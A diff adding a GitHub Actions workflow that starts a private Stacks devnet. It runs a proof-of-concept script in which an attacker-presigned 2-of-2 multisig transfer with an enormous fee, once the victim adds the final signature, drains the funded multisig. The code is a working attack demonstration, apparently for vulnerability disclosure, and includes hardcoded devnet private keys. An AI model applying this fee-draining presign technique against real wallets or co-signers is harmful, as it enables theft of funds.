@@ -1,0 +1,242 @@
+name: Generic Stacks 2-of-2 high-fee devnet acceptance v4
+
+on:
+  pull_request:
+    paths:
+      - "stacks-multisig-devnet-v4-trigger/**"
+
+permissions:
+  contents: read
+
+concurrency:
+  group: stacks-multisig-devnet-v4-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  acceptance:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 40
+    steps:
+      - name: Check out trusted main branch
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        with:
+          ref: main
+          persist-credentials: false
+
+      - name: Install Clarinet and generate snapshot-compatible project
+        run: |
+          set -euo pipefail
+          mkdir -p evidence bin
+          curl --fail --location --retry 5 \
+            https://github.com/stx-labs/clarinet/releases/download/v3.14.0/clarinet-linux-x64-glibc.tar.gz \
+            -o evidence/clarinet-linux-x64-glibc.tar.gz
+          tar -xzf evidence/clarinet-linux-x64-glibc.tar.gz -C bin
+          chmod +x bin/clarinet
+          bin/clarinet --version | tee evidence/CLARINET_VERSION.txt
+          sha256sum evidence/clarinet-linux-x64-glibc.tar.gz bin/clarinet \
+            > evidence/CLARINET_SHA256SUMS.txt
+          bin/clarinet new project --disable-telemetry
+          cp project/settings/Devnet.toml evidence/GENERATED_DEVNET.toml
+          cp project/Clarinet.toml evidence/GENERATED_CLARINET.toml
+          bin/clarinet check --manifest-path project/Clarinet.toml
+          docker info >/dev/null
+
+      - name: Start private snapshot-compatible Devnet
+        run: |
+          set -euo pipefail
+          (bin/clarinet devnet start \
+            --manifest-path project/Clarinet.toml \
+            --no-dashboard > evidence/devnet.log 2>&1 & echo $! > evidence/devnet.pid)
+          for i in $(seq 1 240); do
+            if curl -fsS http://127.0.0.1:20443/v2/info > evidence/node-info.json 2>/dev/null; then
+              break
+            fi
+            sleep 2
+          done
+          if [ ! -s evidence/node-info.json ]; then
+            tail -n 1000 evidence/devnet.log >&2 || true
+            tar -czf evidence/clarinet-cache-failure.tar.gz project/.cache 2>/dev/null || true
+            exit 1
+          fi
+
+      - name: Broadcast and confirm 2-of-2 high-fee transaction
+        run: |
+          set -euo pipefail
+          mkdir -p node-test
+          cd node-test
+          npm init -y >/dev/null
+          npm install --ignore-scripts --no-audit --no-fund --save-exact \
+            @stacks/transactions@7.5.0 \
+            @stacks/network@7.0.2 \
+            @stacks/common@7.0.2
+          cat > acceptance.cjs <<'NODE'
+          'use strict';
+          const fs = require('fs');
+          const t = require('@stacks/transactions');
+          const n = require('@stacks/network');
+          const RPC = 'http://127.0.0.1:20443';
+          const DEVNET = { ...n.STACKS_DEVNET, client: { baseUrl: RPC } };
+          const victimKey = '753b7cc01a1a2e86221266a154af739463fce51219d97e4f856cd7200c3bd2a601';
+          const attackerKey = '7287ba251d44a4d3fd9276c88ce34c5c52a038955511cccaf77e61068649c17801';
+          const victimPub = t.privateKeyToPublic(victimKey);
+          const attackerPub = t.privateKeyToPublic(attackerKey);
+          const fundingAddress = t.getAddressFromPrivateKey(victimKey, DEVNET);
+          const attackerAddress = t.getAddressFromPrivateKey(attackerKey, DEVNET);
+          const fundedBalance = 1_000_000_000n;
+          const transferAmount = 1n;
+          const rawFee = 999_999_999n;
+          const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+          async function account(address) {
+            const response = await fetch(`${RPC}/v2/accounts/${address}?proof=0`);
+            if (!response.ok) throw new Error(`account ${address}: ${response.status} ${await response.text()}`);
+            const data = await response.json();
+            return { balance: BigInt(data.balance), nonce: BigInt(data.nonce), raw: data };
+          }
+          async function waitAccount(address, predicate, label) {
+            let last;
+            for (let i = 0; i < 240; i++) {
+              last = await account(address);
+              if (predicate(last)) return last;
+              await sleep(1000);
+            }
+            throw new Error(`timeout ${label}: ${JSON.stringify(last?.raw)}`);
+          }
+          function sender(tx) {
+            const sc = tx.auth.spendingCondition;
+            const version = t.addressHashModeToVersion(sc.hashMode, DEVNET);
+            return t.addressToString(t.addressFromVersionHash(version, sc.signer));
+          }
+          async function broadcast(tx) {
+            const result = await t.broadcastTransaction({ transaction: tx, network: DEVNET });
+            if (typeof result === 'object' && result && 'error' in result) {
+              throw new Error(`broadcast rejected: ${JSON.stringify(result)}`);
+            }
+            return typeof result === 'string' ? result : result.txid;
+          }
+
+          (async () => {
+            const template = await t.makeUnsignedSTXTokenTransfer({
+              recipient: attackerAddress,
+              amount: transferAmount,
+              publicKeys: [attackerPub, victimPub],
+              numSignatures: 2,
+              fee: rawFee,
+              nonce: 0n,
+              network: DEVNET,
+            });
+            const multisigAddress = sender(template);
+            const funderBefore = await account(fundingAddress);
+            const attackerBefore = await account(attackerAddress);
+            const multisigBefore = await account(multisigAddress);
+            if (multisigBefore.balance !== 0n) throw new Error('multisig address not initially empty');
+
+            const fundingTx = await t.makeSTXTokenTransfer({
+              recipient: multisigAddress,
+              amount: fundedBalance,
+              senderKey: victimKey,
+              fee: 10_000n,
+              nonce: funderBefore.nonce,
+              network: DEVNET,
+            });
+            const fundingTxid = await broadcast(fundingTx);
+            const multisigFunded = await waitAccount(
+              multisigAddress,
+              state => state.balance === fundedBalance,
+              'funding confirmation'
+            );
+
+            const tx = await t.makeUnsignedSTXTokenTransfer({
+              recipient: attackerAddress,
+              amount: transferAmount,
+              publicKeys: [attackerPub, victimPub],
+              numSignatures: 2,
+              fee: rawFee,
+              nonce: multisigFunded.nonce,
+              network: DEVNET,
+            });
+            const signer = new t.TransactionSigner(tx);
+            signer.signOrigin(attackerKey);
+            const partialHex = tx.serialize();
+            const fieldsBeforeVictim = tx.auth.spendingCondition.fields.length;
+            signer.signOrigin(victimKey);
+            const fieldsAfterVictim = tx.auth.spendingCondition.fields.length;
+            const verifyHash = tx.verifyOrigin();
+            const signedHex = tx.serialize();
+            const maliciousTxid = await broadcast(tx);
+
+            const multisigAfter = await waitAccount(
+              multisigAddress,
+              state => state.balance === 0n && state.nonce === multisigFunded.nonce + 1n,
+              'malicious transaction confirmation'
+            );
+            const attackerAfter = await waitAccount(
+              attackerAddress,
+              state => state.balance === attackerBefore.balance + transferAmount,
+              'recipient credit'
+            );
+
+            const result = {
+              environment: 'Clarinet snapshot-compatible private Devnet only',
+              chain_writes: 'local-only',
+              multisig_address: multisigAddress,
+              funding_address: fundingAddress,
+              attacker_address: attackerAddress,
+              funding_txid: fundingTxid,
+              malicious_txid: maliciousTxid,
+              funded_balance_microstx: fundedBalance.toString(),
+              transfer_microstx: transferAmount.toString(),
+              raw_fee_microstx: rawFee.toString(),
+              total_spend_microstx: (rawFee + transferAmount).toString(),
+              balance_before_microstx: multisigFunded.balance.toString(),
+              balance_after_microstx: multisigAfter.balance.toString(),
+              attacker_delta_microstx: (attackerAfter.balance - attackerBefore.balance).toString(),
+              auth_fields_before_victim: fieldsBeforeVictim,
+              auth_fields_after_victim: fieldsAfterVictim,
+              verify_origin_hash: verifyHash,
+              checks: {
+                two_of_two: tx.auth.spendingCondition.signaturesRequired === 2,
+                attacker_presigned: fieldsBeforeVictim === 1,
+                victim_added_final_signature: fieldsAfterVictim === 2,
+                broadcast_accepted: true,
+                block_effect_observed: true,
+                multisig_balance_drained: multisigAfter.balance === 0n,
+                recipient_credited: attackerAfter.balance - attackerBefore.balance === transferAmount,
+                fee_plus_transfer_equals_balance: rawFee + transferAmount === fundedBalance,
+              },
+            };
+            fs.writeFileSync('../evidence/ACCEPTANCE_RESULT.json', JSON.stringify(result, null, 2) + '\n');
+            fs.writeFileSync('../evidence/PARTIALLY_SIGNED_TX.hex', partialHex + '\n');
+            fs.writeFileSync('../evidence/FULLY_SIGNED_TX.hex', signedHex + '\n');
+            console.log(JSON.stringify(result, null, 2));
+          })().catch(error => {
+            console.error(error.stack || error);
+            process.exit(1);
+          });
+          NODE
+          node acceptance.cjs | tee ../evidence/acceptance-console.log
+          cd ..
+          jq -e '.checks | to_entries | all(.value == true)' evidence/ACCEPTANCE_RESULT.json >/dev/null
+          sha256sum evidence/ACCEPTANCE_RESULT.json evidence/PARTIALLY_SIGNED_TX.hex \
+            evidence/FULLY_SIGNED_TX.hex evidence/acceptance-console.log \
+            > evidence/EVIDENCE_SHA256SUMS.txt
+
+      - name: Capture and stop private Devnet
+        if: always()
+        run: |
+          docker ps -a > evidence/docker-ps.txt || true
+          docker images > evidence/docker-images.txt || true
+          tail -n 1200 evidence/devnet.log > evidence/devnet-tail.log || true
+          tar -czf evidence/clarinet-cache.tar.gz project/.cache 2>/dev/null || true
+          if [ -s evidence/devnet.pid ]; then kill "$(cat evidence/devnet.pid)" 2>/dev/null || true; fi
+          docker ps -aq | xargs -r docker rm -f || true
+
+      - name: Upload local acceptance evidence
+        if: always()
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: stacks-2of2-high-fee-devnet-v4-20260801
+          path: evidence
+          if-no-files-found: error
+          retention-days: 1
+          compression-level: 6
